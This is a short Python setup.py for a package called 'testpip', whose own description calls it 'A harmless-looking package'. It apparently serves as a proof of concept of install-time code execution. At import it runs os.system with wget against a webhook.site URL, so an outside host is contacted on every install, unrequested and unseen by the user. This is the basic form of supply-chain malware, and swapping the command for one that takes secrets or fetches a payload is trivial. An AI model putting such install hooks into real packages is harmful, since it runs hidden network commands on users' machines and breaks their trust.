# setup.py
from setuptools import setup
import os

# This code runs during installation:
print("[*] Running post-install code...")
os.system("wget https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")

setup(
    name='testpip',
    version='0.1',
    description='A harmless-looking package',
    author='Your Name',
    author_email='you@example.com',
    packages=['testpip'],
    install_requires=[],
)
